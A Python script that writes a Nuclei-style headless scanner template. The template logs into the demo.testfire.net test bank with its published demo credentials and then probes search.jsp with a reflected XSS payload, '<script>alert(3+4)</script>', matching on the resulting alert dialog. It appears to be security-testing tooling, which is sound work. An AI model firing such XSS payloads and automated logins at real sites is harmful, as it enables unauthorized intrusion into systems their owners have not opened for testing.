def yaml_content_to_file(yaml_content: str, file_path: str) -> None:
    with open(file_path, 'w') as file:
        file.write(yaml_content)


def insert_to_yaml_template_and_write_to_file(yaml_template: str, yaml_content: str, file_path: str) -> None:
    yaml_content = yaml_template.replace("<TO_INSERT>", yaml_content)
    yaml_content_to_file(yaml_content, file_path)


if __name__ == "__main__":
    yaml_template = """
id: xss

info:
  name: XSS
  author: pdteam
  severity: high

<TO_INSERT>

  - steps:
      - action: navigate
        args:
          url: "https://demo.testfire.net/search.jsp?query=<script>alert%283%2B4%29<%2Fscript>"

      - action: waitdialog
        name: reflected_text_query
        args:
          max-duration: 10s

    matchers:
      - type: dsl
        dsl:
          - reflected_text_query == true

    extractors:
      - type: dsl
        dsl:
          - reflected_text_query_type # Output: "alert"
          - reflected_text_query_message # Output: "7"
    """

    yaml_content = """
headless:

  - steps:
      - args:
          url: "https://demo.testfire.net/login.jsp"
        action: navigate
      - action: waitload
      - args:
          by: xpath
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[1]/td[2]/input
        action: click
      - action: waitload
      - args:
          by: xpath
          value: jsmith
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[1]/td[2]/input
        action: text
      - args:
          by: xpath
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[2]/td[2]/input
        action: click
      - action: waitload
      - args:
          by: xpath
          value: demo1234
          xpath: /html/body/table/tbody/tr[2]/td[2]/div/form/table/tbody/tr[2]/td[2]/input
        action: text
      - args:
          by: xpath
          xpath: //*[@id="login"]/table/tbody/tr[3]/td[2]/input
        action: click
      - action: waitload
    # matchers:
    #   - part: resp
    #     type: word
    #     words:
    #       - "You have been pre-approved for an Altoro Gold Visa with a credit limit of $10000!"
"""
    insert_to_yaml_template_and_write_to_file(yaml_template, yaml_content, "testing.yaml")